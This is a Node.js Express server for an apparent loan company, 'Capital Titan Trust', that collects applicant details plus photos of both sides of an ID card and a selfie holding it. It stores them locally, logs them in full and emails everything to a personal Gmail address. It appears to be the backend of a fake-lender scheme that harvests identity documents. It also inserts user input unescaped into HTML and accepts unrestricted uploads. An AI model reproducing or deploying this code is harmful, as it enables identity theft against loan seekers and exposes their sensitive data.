const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const brevo = require('@getbrevo/brevo');

const app = express();

// Make sure folders exist
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads', { recursive: true });
if (!fs.existsSync('application.json')) fs.writeFileSync('application.json', '[]');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    cb(null, file.fieldname + '-' + Date.now() + '-' + Math.random().toString(36).slice(2,8) + ext);
  }
});
const upload = multer({ storage: storage });

app.use(express.static(path.join(__dirname, 'Public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// BREVO - WORKS ON RENDER FREE PLAN
const apiInstance = new brevo.TransactionalEmailsApi();
apiInstance.setApiKey(brevo.TransactionalEmailsApiApiKeys.apiKey, process.env.BREVO_API_KEY);

let lastSend = 0;
let lastHash = '';

app.post('/apply', upload.fields([
  { name: 'IDCardFront', maxCount: 1 },
  { name: 'IDCardBack', maxCount: 1 },
  { name: 'selfieWithCard', maxCount: 1 }
]), async (req, res) => {

  const now = Date.now();
  const hash = JSON.stringify(req.body);
  if (hash === lastHash && now - lastSend < 15000) {
    console.log('⚠️ DUPLICATE BLOCKED');
    return res.json({ success: true, id: 'DUPLICATE' });
  }
  lastHash = hash;
  lastSend = now;

  const data = req.body;
  const id = 'CTT-' + Date.now();

  let apps = [];
  try { apps = JSON.parse(fs.readFileSync('application.json', 'utf8')); } catch (e) { apps = []; }

  const entry = {
    id: id,
    date: new Date().toLocaleString(),
  ...data,
    images: {
      front: req.files?.IDCardFront?.[0]?.filename || null,
      back: req.files?.IDCardBack?.[0]?.filename || null,
      selfie: req.files?.selfieWithCard?.[0]?.filename || null
    }
  };
  apps.push(entry);
  fs.writeFileSync('application.json', JSON.stringify(apps, null, 2));

  console.log('\n========================================');
  console.log(`🔥 NEW APPLICATION: ${id}`);
  console.log(JSON.stringify(entry, null, 2));
  console.log('========================================\n');

  // Prepare attachments for Brevo (base64)
  let attachments = [];
  try {
    if (req.files?.IDCardFront) {
      const content = fs.readFileSync(req.files.IDCardFront[0].path).toString('base64');
      attachments.push({ content: content, name: 'Front.jpg', contentId: 'front' });
    }
    if (req.files?.IDCardBack) {
      const content = fs.readFileSync(req.files.IDCardBack[0].path).toString('base64');
      attachments.push({ content: content, name: 'Back.jpg', contentId: 'back' });
    }
    if (req.files?.selfieWithCard) {
      const content = fs.readFileSync(req.files.selfieWithCard[0].path).toString('base64');
      attachments.push({ content: content, name: 'Selfie.jpg', contentId: 'selfie' });
    }
  } catch(e) { console.log("Attachment read error:", e.message) }

  let rows = '';
  for (let k in data) {
    rows += `<tr><td style="padding:10px;border:1px solid #ddd;background:#f5f5f5"><b>${k}</b></td><td style="padding:10px;border:1px solid #ddd">${data[k] || '-'}</td></tr>`;
  }

  const html = `
  <div style="font-family:Arial,sans-serif;max-width:700px;margin:auto;border:1px solid #ddd;background:#fff">
    <div style="background:#003366;color:white;padding:25px;text-align:center">
      <h1 style="margin:0">Capital Titan Trust</h1>
      <p style="margin:5px 0">✅ NEW LOAN APPLICATION</p>
      <p style="font-size:12px">ID: ${id} | ${new Date().toLocaleString()}</p>
    </div>
    <div style="padding:25px">
      <h3 style="color:#003366">Applicant Details</h3>
      <table style="width:100%;border-collapse:collapse;font-size:14px">${rows}</table>
      <h3 style="color:#003366;margin-top:30px;border-bottom:2px solid #003366;padding-bottom:10px">📸 DOCUMENTS</h3>
      <p>Images are attached to this email as files + inline below:</p>
      ${req.files?.IDCardFront? `<div style="text-align:center;margin:15px 0"><h4>ID FRONT</h4><img src="cid:front" style="width:100%;max-width:450px;border-radius:12px;border:3px solid #003366"></div>` : '<p>❌ No Front</p>'}
      ${req.files?.IDCardBack? `<div style="text-align:center;margin:15px 0"><h4>ID BACK</h4><img src="cid:back" style="width:100%;max-width:450px;border-radius:12px;border:3px solid #003366"></div>` : '<p>❌ No Back</p>'}
      ${req.files?.selfieWithCard? `<div style="text-align:center;margin:15px 0"><h4>SELFIE WITH ID</h4><img src="cid:selfie" style="width:100%;max-width:450px;border-radius:12px;border:3px solid #003366"></div>` : '<p>❌ No Selfie</p>'}
    </div>
  </div>`;

  try {
    let sendSmtpEmail = new brevo.SendSmtpEmail();
    sendSmtpEmail.subject = `🔥 NEW LOAN ${id} - ${data.firstName || ''} ${data.lastName || ''} - ${data.phone || ''}`;
    sendSmtpEmail.htmlContent = html;
    sendSmtpEmail.sender = { name: "Capital Titan Trust", email: "nancymikos6@gmail.com" };
    sendSmtpEmail.to = [{ email: "nancymikos6@gmail.com", name: "Nancy" }];
    sendSmtpEmail.attachment = attachments;

    await apiInstance.sendTransacEmail(sendSmtpEmail);
    console.log(`✅ EMAIL SENT VIA BREVO: ${id}`);
    res.json({ success: true, id: id, data: entry });
  } catch (err) {
    console.error('❌ Brevo Error:', err.message, err.body || '');
    // STILL save, but tell user there was error
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3002;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅ Server running on http://localhost:${PORT}`);
});